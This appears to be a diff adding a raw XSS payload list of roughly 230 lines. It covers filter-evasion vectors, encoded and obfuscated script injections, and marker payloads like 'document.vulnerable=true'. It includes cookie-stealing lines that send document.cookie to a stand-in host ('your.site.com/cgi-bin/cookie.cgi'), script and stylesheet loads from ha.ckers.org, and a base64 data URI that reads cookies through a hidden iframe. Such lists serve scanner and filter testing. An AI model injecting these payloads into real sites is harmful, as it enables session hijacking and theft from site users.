@@ -1,0 +1,231 @@
+<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
+<SCRIPT>document.vulnerable=true;</SCRIPT>
+<IMG SRC="jav ascript:document.vulnerable=true;">
+<IMG SRC=" &#14; javascript:document.vulnerable=true;">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
+<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
+<SCRIPT <B>document.vulnerable=true;</SCRIPT>
+<IMG SRC="javascript:document.vulnerable=true;"
+<iframe src="javascript:document.vulnerable=true; <
+<SCRIPT>a=/XSS/\ndocument.vulnerable=true;</SCRIPT>
+\";document.vulnerable=true;;//
+</TITLE><SCRIPT>document.vulnerable=true;</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
+<BODY BACKGROUND="javascript:document.vulnerable=true;">
+<BODY ONLOAD=document.vulnerable=true;>
+<IMG LOWSRC="javascript:document.vulnerable=true;">
+<BR SIZE="&{document.vulnerable=true}">
+<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
+<STYLE>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
+oscriptaedocument.vulnerable=true;o/scriptae
+<IFRAME SRC="javascript:document.vulnerable=true;"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></FRAMESET>
+<TABLE BACKGROUND="javascript:document.vulnerable=true;">
+<TABLE><TD BACKGROUND="javascript:document.vulnerable=true;">
+<DIV STYLE="background-image: url(javascript:document.vulnerable=true;)">
+<DIV STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
+<DIV STYLE="width: expression(document.vulnerable=true);">
+<STYLE>@im\port'\ja\vasc\ript:document.vulnerable=true';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
+<XSS STYLE="xss:expression(document.vulnerable=true)">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
+<STYLE>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</STYLE>
+<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
+<BASE HREF="javascript:document.vulnerable=true;//">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></OBJECT>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></HTML>
+<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
+<a href="javascript#document.vulnerable=true;">
+<div onmouseover="document.vulnerable=true;">
+<input type="image" dynsrc="javascript:document.vulnerable=true;">
+&<script>document.vulnerable=true;</script>
+&{document.vulnerable=true;};
+<img src=&{document.vulnerable=true;};>
+<img src="mocha:document.vulnerable=true;">
+<img src="livescript:document.vulnerable=true;">
+<a href="about:<script>document.vulnerable=true;</script>">
+<body onload="document.vulnerable=true;">
+<div style="background-image: url(javascript:document.vulnerable=true;);">
+<div style="behaviour: url([link to code]);">
+<div style="binding: url([link to code]);">
+<div style="width: expression(document.vulnerable=true;);">
+<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
+<style><!--</style><script>document.vulnerable=true;//--></script>
+<<script>document.vulnerable=true;</script>
+<![CDATA[<!--]]<script>document.vulnerable=true;//--></script>
+<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
+<img src="blah"onmouseover="document.vulnerable=true;">
+<img src="blah>" onmouseover="document.vulnerable=true;">
+<xml src="javascript:document.vulnerable=true;">
+<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
+<script>alert(1)<script>
+<img src=l onerror=alert(2)>
+,Aeu><script >alert(document.cookie)</script >
+,Aeu><ScRiPt>alert(document.cookie)</ScRiPt>
+,Aeu%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+,Aeu><scr<script>ipt>alert(document.cookie)</scr</script>ipt> %00,Aeu>
+<script>alert(document.cookie)</script>
+"><script>"
+<script>alert("XSS")</script>
+<<script>alert("XSS");//<</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+\";alert('XSS');//
+%3cscript%3ealert("XSS");%3c/script%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+&ltscript&gtalert(document.cookie);</script>
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+<xss><script>alert('XSS')</script></vulnerable>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("'XSS'")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+'';!--"<XSS>=&{()}
+"><script >alert(document.cookie)</script >
+"><ScRiPt>alert(document.cookie)</ScRiPt>
+"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+"><scr<script>ipt>alert(document.cookie)</scr</script>ipt> %00">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<video><source onerror="javascript:alert(1)">
+<video onerror="javascript:alert('XSS');"><source>
+<video onerror="javascript:alert(1);"><source>
+<audio onerror="javascript:alert('XSS');"><source>
+<audio onerror="javascript:alert(1);"><source>
+<from id onforminput=alert(1)><input></form>
+<from id onforminput=alert('XSS')><input></form>
+<button from=test onformchange=alert(w)>X
+formaction="javascript:alert(1)">X
+<input type="text" value="<script>alert(1)</script>
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<input onblur=write(1) autofocus><input autofocus>
+<body oninput=alert(1)><input autofocus>
+<frameset onload=alert(1)>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<style><img src="</style><img src=x onerror=alert(1)//">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<B <SCRIPT>alert(1)</SCRIPT>>
+<B="<SCRIPT>alert(1)</SCRIPT>">
+<IMG SRC=`javascript:alert(1)`>
+<S[0x00]CRIPT>alert(1)</S[0x00]CRIPT>
+<A """><IMG SRC="javascript:alert(1)">
+<IMG onmouseover =alert(1)>
+<A/HREF="javascript:alert(1)">
+<!-- Hello -- world > <SCRIPT>alert(1)</SCRIPT> -->
+<IMG ALT="><SCRIPT>alert(1)</SCRIPT>"(EOF)
+<![><IMG ALT="]><SCRIPT>alert(1)</SCRIPT>">
+'Hello world</SCRIPT><SCRIPT>alert(1)</SCRIPT>'
+<STYLE>body{background-image: url('http://example.com/foo.jpg?</STYLE><SCRIPT>alert(1)</SCRIPT>');}</STYLE>
+<STYLE><!-- </STYLE><SCRIPT>alert(1)</SCRIPT> --></STYLE>
+<html xmlns="http://www.w3.org/1999/xhtml"><script>alert('Hello world!')</script></html></container>
+<a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a>
+<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
+<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
+<style>*[{}@import'test.css?]{color: green;}</style>X
+<div style="font-family:'foo[a];color:red;';">XXX</div>
+<a href="http://www.google.com"> <iframe src="http://www.google.com/"></iframe> </a>
+<iframe src="http://www.www.google.com/dropHere.html"></iframe>
+<textarea type="text" cols="50" rows="10"></textarea>
+<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://www.google.com/"></iframe>
+<b>drag and drop one of the following strings to the drop box:</b> <br/><hr/> jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b> <br/><hr/> feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);// <br/><hr/> <div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+<meta charset="x-mac-farsi">¼script ¾alert(1)//¼/script ¾
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>
+<SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS> <SCRIPT Language="javascript">alert(1)</SCRIPT> </SCRIPTLET>
+<?xml version="1.0"?> <x> <payload><![CDATA[<img src=x onerror=alert(1)>]]></payload> </x>
+<event-source src="event.php" onload="alert(1)">
+<?php header("Content-Type: application/x-dom-event-stream"); die("Event: load\ndata: \n\n"); ?>
+<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>
+<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
+<script>alert(document.domain)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD5pZihkb2N1bWVudC5kb21haW49PSd0aW55dXJsLmNvbScpbG9jYXRpb24ucmVsb2FkKCk7ZWxzZXthbGVydChkb2N1bWVudC5kb21haW4pfTwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD5pZihkb2N1bWVudC5kb21haW49PSd0aW55dXJsLmNvbScpbG9jYXRpb24ucmVsb2FkKCk7ZnVuY3Rpb24gYSgpe2FsZXJ0KGRvY3VtZW50LmZyYW1lc1swXS5kb2N1bWVudC5jb29raWUpfWZ1bmN0aW9uIGIoKXt2YXIgaT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTtpLnN0eWxlPSd3aWR0aDowcHg7aGVpZ2h0OjBweDt2aXNpYmlsaXR5OmhpZGRlbic7aS5zcmMgPSAnaHR0cHM6Ly9yZG90Lm9yZy9mb3J1bS9jbGllbnRzY3JpcHQvdmJ1bGxldGluX3JlYWRfbWFya2VyLmpzJztpLm9ubG9hZD1mdW5jdGlvbigpe2EoKX07ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpKX08L3NjcmlwdD48Ym9keSBvbmxvYWQ9YigpPg==
+<script/%00%00%00%00%00>alert(1)</script>
+%00%00v%00%00<script>alert(1)</script>
+<script/%00%00v%00%00>alert(1)</script>
+%c0″//(%000000%0dalert(1)//
+<xml id=cdcat><note><to>%26lt;span style=x:exp<![CDATA[r]]>ession(alert(3))%26gt;hello%26lt;/span%26gt;</to></note></xml><table border=%221%22 datasrc=%22%23cdcat%22><tr><td><span datafld=%22to%22 DATAFORMATAS=html></span></td></tr></table>
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<iframe src=http://ha.ckers.org/scriptlet.html <
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="livescript:[code]">
+<BODY ONLOAD=alert('XSS')>
+<BGSOUND SRC="javascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
+¼script¾alert(¢XSS¢)¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<BASE HREF="javascript:alert('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<A HREF="http://66.102.7.147/">XSS</A>
